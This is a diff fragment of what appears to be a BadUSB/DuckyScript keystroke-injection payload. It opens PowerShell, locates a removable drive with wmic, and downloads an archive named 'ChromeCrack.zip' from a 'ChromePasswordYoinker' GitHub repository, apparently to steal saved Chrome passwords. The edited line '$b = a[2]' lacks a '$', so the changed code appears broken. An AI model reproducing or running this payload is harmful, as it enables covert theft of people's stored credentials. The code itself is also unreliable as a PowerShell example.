@@ -24,10 +24,10 @@ DELAY 800
 STRING powershell
 ENTER
 DELAY 800
-STRING $b = cmd /c "wmic logicaldisk where drivetype=2 get deviceid"
+STRING $a = cmd /c "wmic logicaldisk where drivetype=2 get deviceid"
 ENTER
 DELAY 800
-STRING $b[2]
+STRING $b = a[2]
 ENTER
 DELAY 800
 STRING Invoke-WebRequest -Uri 'https://github.com/lucianchauvin/ChromePasswordYoinker/raw/master/ChromeCrack.zip' -OutFile "$b[2]:\Users\$env:UserName\ChromeCracker.zip"
